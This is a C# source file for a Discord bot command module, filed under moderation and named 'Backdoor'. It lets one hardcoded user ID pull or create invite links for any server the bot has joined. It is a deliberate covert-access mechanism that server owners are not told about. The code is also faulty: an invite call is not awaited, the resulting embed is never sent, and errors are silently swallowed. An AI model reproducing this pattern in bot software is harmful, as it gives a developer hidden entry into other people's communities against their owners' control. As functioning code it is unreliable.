using System;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace Discord_Bot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary ("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildID)
        {
            if(!(Context.User.Id == 131699743280594944))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }
            if (Context.Client.Guilds.Where(x => x.Id == GuildID).Count() <1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + GuildID);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();
            try
            {
                var Invites = await Guild.GetInvitesAsync();
                if (Invites.Count() < 1)
                {
                    try
                    {
                        Guild.TextChannels.First().CreateInviteAsync();
                    }catch (Exception ex)
                    {
                        await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with error ''{ex.Message}''");
                        return;
                    }
                }
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"Invites for guild {Guild.Name}:", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);
                foreach (var Current in Invites)
                    Embed.AddField("Invite:", $"[Invite]({Current.Url})");
            } catch (Exception ex)
            {

            }
        }
    }
}
